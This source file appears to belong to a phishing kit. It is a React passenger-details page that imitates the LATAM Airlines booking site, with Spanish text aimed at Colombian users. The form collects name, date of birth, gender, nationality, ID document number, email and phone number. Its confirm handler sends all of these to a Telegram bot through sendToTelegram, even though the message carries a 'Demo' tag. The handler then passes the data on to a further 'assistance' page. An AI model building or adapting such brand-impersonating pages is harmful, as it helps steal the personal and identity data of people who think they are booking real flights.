import React, { useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import { Menu, User, Calendar, ChevronDown, ChevronUp } from 'lucide-react';
import DatePicker from 'react-datepicker';
import "react-datepicker/dist/react-datepicker.css";
import { es } from 'date-fns/locale';
import { sendToTelegram } from '../utils/telegram';
import { ROUTES } from '../routes';

const CustomDateInput = React.forwardRef(({ value, onClick, placeholder }, ref) => (
  <div className="relative w-full">
    <input
      onClick={onClick}
      ref={ref}
      value={value}
      readOnly
      placeholder={placeholder}
      className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B] cursor-pointer bg-white"
    />
    <Calendar className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-400 w-5 h-5 pointer-events-none" />
  </div>
));

function Passengers() {
  const location = useLocation();
  const navigate = useNavigate();
  console.log('Passengers page loaded', location.state);
  
  // eslint-disable-next-line no-unused-vars
  const { origin, destination, startDate, returnDate, tripType, selectedOutbound, selectedInbound } = location.state || {};

  const [formData, setFormData] = useState({
    name: '',
    surname: '',
    dob: null,
    gender: '',
    nationality: 'Colombia',
    docType: 'Cédula de Identidad',
    docNumber: '',
    email: '',
    phoneCode: '+57',
    phoneNumber: ''
  });

  const [isPriceExpanded, setIsPriceExpanded] = useState(false);

  const calculateTotal = () => {
    let total = 0;
    if (selectedOutbound) total += selectedOutbound.price;
    if (selectedInbound) total += selectedInbound.price;
    return total;
  };

  const totalPrice = calculateTotal();

  const isFormValid = () => {
    return (
      formData.name.trim() !== '' &&
      formData.surname.trim() !== '' &&
      formData.dob !== null &&
      formData.gender !== '' &&
      formData.nationality !== '' &&
      formData.docType !== '' &&
      formData.docNumber.trim() !== '' &&
      formData.email.trim() !== '' &&
      formData.phoneNumber.length === 10 &&
      formData.phoneNumber.startsWith('3')
    );
  };

  const isValid = isFormValid();

  const handleConfirm = async () => {
    if (isValid) {
      const message = `
*Nueva Reserva (Demo)*
👤 *Nombre:* ${formData.name} ${formData.surname}
📅 *Fecha Nacimiento:* ${formData.dob ? formData.dob.toLocaleDateString('es-ES') : 'N/A'}
⚧ *Género:* ${formData.gender}
🌍 *Nacionalidad:* ${formData.nationality}
🆔 *Documento:* ${formData.docType} ${formData.docNumber}
📧 *Email:* ${formData.email}
📱 *Teléfono:* ${formData.phoneCode} ${formData.phoneNumber}

✈️ *Vuelo Ida:* ${selectedOutbound ? `${selectedOutbound.origin} -> ${selectedOutbound.destination}` : 'N/A'}
💰 *Precio Total:* COP ${totalPrice.toLocaleString('es-CO')}
      `;

      const success = await sendToTelegram(message);

      if (success) {
        // Navegar a la página de asistencia pasando el estado
        navigate(ROUTES.ASSISTANCE, {
          state: {
            origin,
            destination,
            startDate,
            returnDate,
            tripType,
            selectedOutbound,
            selectedInbound,
            formData
          }
        });
        window.scrollTo(0, 0);
      } else {
        alert('Reserva confirmada. (Nota: Configura el token de Telegram en .env para recibir los datos)');
      }
    }
  };

  return (
    <div className="min-h-screen bg-[#F5F5F5] font-sans pb-32">
      {/* Header */}
      <header className="bg-[#0B153D] text-white p-4 flex justify-between items-center sticky top-0 z-50">
        <div className="flex items-center gap-2 cursor-pointer" onClick={() => navigate('/')}>
          <div className="flex flex-col leading-none">
            <span className="font-bold text-xl tracking-wider">LATAM</span>
            <span className="text-[0.6rem] tracking-widest text-gray-300">AIRLINES</span>
          </div>
          <div className="text-red-500">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor">
                <path d="M2,2 L10,2 L2,10 Z" />
                <path d="M12,4 L20,4 L12,12 Z" />
                <path d="M4,14 L12,14 L4,22 Z" />
             </svg>
          </div>
        </div>
        
        <div className="flex items-center gap-4">
           <Menu className="w-6 h-6 cursor-pointer" />
        </div>
      </header>

      <div className="p-4 max-w-lg mx-auto">
        <h1 className="text-2xl text-[#0B153D] font-light mb-6">
          Pasajeros
        </h1>

        <div className="bg-white rounded-lg shadow-sm mb-6 overflow-hidden">
          <div className="p-4 border-b flex justify-between items-center">
            <div className="flex items-center gap-3">
              <div className="w-8 h-8 rounded-full bg-gray-100 flex items-center justify-center text-[#0B153D]">
                <User className="w-5 h-5" />
              </div>
              <span className="text-[#0B153D] font-bold text-lg">Adulto</span>
            </div>
            <ChevronUp className="text-[#E8114B] w-6 h-6" />
          </div>

          <div className="p-4 space-y-6">
            <div>
              <input 
                type="text" 
                placeholder="Nombre" 
                className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                value={formData.name}
                onChange={(e) => setFormData({...formData, name: e.target.value})}
              />
            </div>
            
            <div>
              <input 
                type="text" 
                placeholder="Apellido" 
                className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                value={formData.surname}
                onChange={(e) => setFormData({...formData, surname: e.target.value})}
              />
            </div>

            <div>
              <label className="block text-xs text-gray-500 mb-1 ml-1">Fecha de nacimiento *</label>
              <DatePicker
                selected={formData.dob}
                onChange={(date) => setFormData({...formData, dob: date})}
                customInput={<CustomDateInput placeholder="dd-mm-aaaa" />}
                locale={es}
                dateFormat="dd-MM-yyyy"
                showYearDropdown
                scrollableYearDropdown
                yearDropdownItemNumber={100}
                maxDate={new Date()}
              />
            </div>

            <div className="relative">
               <label className="absolute -top-2 left-3 bg-white px-1 text-xs text-gray-500">Género</label>
               <select 
                 className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 appearance-none bg-white focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                 value={formData.gender}
                 onChange={(e) => setFormData({...formData, gender: e.target.value})}
               >
                 <option value="" disabled hidden>Seleccionar</option>
                 <option value="Masculino">Masculino</option>
                 <option value="Femenino">Femenino</option>
               </select>
               <ChevronDown className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none w-5 h-5" />
            </div>

            <div className="relative">
               <label className="absolute -top-2 left-3 bg-white px-1 text-xs text-gray-500">Nacionalidad</label>
               <select 
                 className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 appearance-none bg-white focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                 value={formData.nationality}
                 onChange={(e) => setFormData({...formData, nationality: e.target.value})}
               >
                 <option value="Colombia">Colombia</option>
                 <option value="Chile">Chile</option>
                 <option value="Perú">Perú</option>
                 <option value="Brasil">Brasil</option>
               </select>
               <ChevronDown className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none w-5 h-5" />
            </div>

            <div className="relative">
               <label className="absolute -top-2 left-3 bg-white px-1 text-xs text-gray-500">Tipo de documento</label>
               <select 
                 className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 appearance-none bg-white focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                 value={formData.docType}
                 onChange={(e) => setFormData({...formData, docType: e.target.value})}
               >
                 <option value="Cédula de Identidad">Cédula de Identidad</option>
                 <option value="Pasaporte">Pasaporte</option>
               </select>
               <ChevronDown className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none w-5 h-5" />
            </div>

            <div>
              <input 
                type="text" 
                placeholder="Número de documento" 
                className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                value={formData.docNumber}
                onChange={(e) => setFormData({...formData, docNumber: e.target.value})}
              />
              <p className="text-xs text-gray-500 mt-1 ml-1">Sin puntos ni guión</p>
            </div>
          </div>
        </div>

        <div className="bg-white rounded-lg shadow-sm mb-6 p-6">
           <h2 className="text-[#5C2E91] text-lg font-medium mb-6">Información de contacto</h2>
           
           <div className="space-y-6">
             <div>
              <input 
                type="email" 
                placeholder="Email" 
                className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                value={formData.email}
                onChange={(e) => setFormData({...formData, email: e.target.value})}
              />
            </div>

            <div className="relative">
               <label className="absolute -top-2 left-3 bg-white px-1 text-xs text-gray-500">Código</label>
               <select 
                 className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 appearance-none bg-white focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                 value={formData.phoneCode}
                 onChange={(e) => setFormData({...formData, phoneCode: e.target.value})}
               >
                 <option value="+57">+57</option>
               </select>
               <ChevronDown className="absolute right-4 top-1/2 transform -translate-y-1/2 text-gray-500 pointer-events-none w-5 h-5" />
            </div>

            <div>
              <input 
                type="tel" 
                placeholder="Número" 
                className="w-full p-4 border border-gray-400 rounded-lg text-gray-700 focus:outline-none focus:border-[#E8114B] focus:ring-1 focus:ring-[#E8114B]"
                value={formData.phoneNumber}
                maxLength={10}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, '');
                  setFormData({...formData, phoneNumber: val});
                }}
              />
            </div>
           </div>
           
           <button 
             onClick={handleConfirm}
             className={`w-full mt-8 py-3 border font-bold rounded-lg transition-colors ${
               isValid 
                 ? 'border-[#E8114B] text-[#E8114B] hover:bg-red-50' 
                 : 'border-gray-300 text-gray-300 cursor-not-allowed'
             }`}
             disabled={!isValid}
           >
             Confirmar datos
           </button>
        </div>
      </div>

      {/* Footer */}
      <div className="fixed bottom-0 left-0 right-0 bg-white shadow-[0_-4px_6px_-1px_rgba(0,0,0,0.1)] z-50">
         <div 
           className="px-4 py-2 border-b flex justify-between items-center cursor-pointer"
           onClick={() => setIsPriceExpanded(!isPriceExpanded)}
         >
           <div className="flex items-center gap-2 text-[#5C2E91] font-bold">
             Precio final <ChevronUp className={`w-5 h-5 transition-transform ${isPriceExpanded ? 'rotate-180' : ''}`} />
           </div>
           <div className="font-bold text-[#0B153D]">
             COP {totalPrice.toLocaleString('es-CO')}
           </div>
         </div>
         
         {isPriceExpanded && (
           <div className="px-4 py-2 bg-gray-50 text-sm text-gray-600">
             {selectedOutbound && (
               <div className="flex justify-between py-1">
                 <span>Vuelo Ida</span>
                 <span>COP {selectedOutbound.price.toLocaleString('es-CO')}</span>
               </div>
             )}
             {selectedInbound && (
               <div className="flex justify-between py-1">
                 <span>Vuelo Vuelta</span>
                 <span>COP {selectedInbound.price.toLocaleString('es-CO')}</span>
               </div>
             )}
           </div>
         )}

         <div className="p-4">
           <button 
             onClick={handleConfirm}
             disabled={!isValid}
             className={`w-full py-3 font-bold rounded-lg transition-colors ${
               isValid 
                 ? 'bg-[#E8114B] text-white hover:bg-[#d00f43]' 
                 : 'bg-gray-200 text-gray-400 cursor-not-allowed'
             }`}
           >
             Continuar
           </button>
         </div>
      </div>
    </div>
  );
}

export default Passengers;
